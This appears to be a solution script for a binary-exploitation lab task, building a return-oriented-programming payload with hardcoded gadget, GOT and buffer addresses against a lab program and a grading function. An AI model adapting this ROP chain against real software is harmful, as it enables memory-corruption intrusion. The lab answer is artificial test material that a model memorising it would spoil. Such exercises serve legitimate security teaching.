#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

filler = b"ABCDEFGHIJKLMNOPQRSTUVWX"
round1 = b"\x2a\x1a\x40\x00\x00\x00\x00\x00" + b"\x00" * 8 + b"\x01\x00\x00\x00\x00\x00\x00\x00" + b"\x48\x20\x60\x00\x00\x00\x00\x00" + b"\x90\x20\x60\x00\x00\x00\x00\x00" + b"\x00" * 16 + b"\x16\x1a\x40\x00\x00\x00\x00\x00"
round2 = b"\x00" * 16 + b"\x01\x00\x00\x00\x00\x00\x00\x00" + b"\x90\x20\x60\x00\x00\x00\x00\x00" + b"\x04\x00\x00\x00\x00\x00\x00\x00" + b"\x00" * 16 + b"\x16\x1a\x40\x00\x00\x00\x00\x00"
extra_input = b"\x78\x19\x40\x00\x00\x00\x00"

payload = filler + round1 + round2 + b"\n" + extra_input
# grade_eval starts at 0x401978
# command_buf begins at 0x602090
# objdump -R shows that 0x602048 stores the func address of gets

#	GADGET 1
#   401a2a:	5b                   	pop    %rbx
#   401a2b:	5d                   	pop    %rbp
#   401a2c:	41 5c                	pop    %r12
#   401a2e:	41 5d                	pop    %r13
#   401a30:	41 5e                	pop    %r14
#   401a32:	41 5f                	pop    %r15
#   401a34:	c3                   	ret

#	GADGET 2
#   401a16:	44 89 ef             	mov    %r13d,%edi
#   401a19:	41 ff 14 dc          	call   *(%r12,%rbx,8)

sys.stdout.buffer.write(payload)
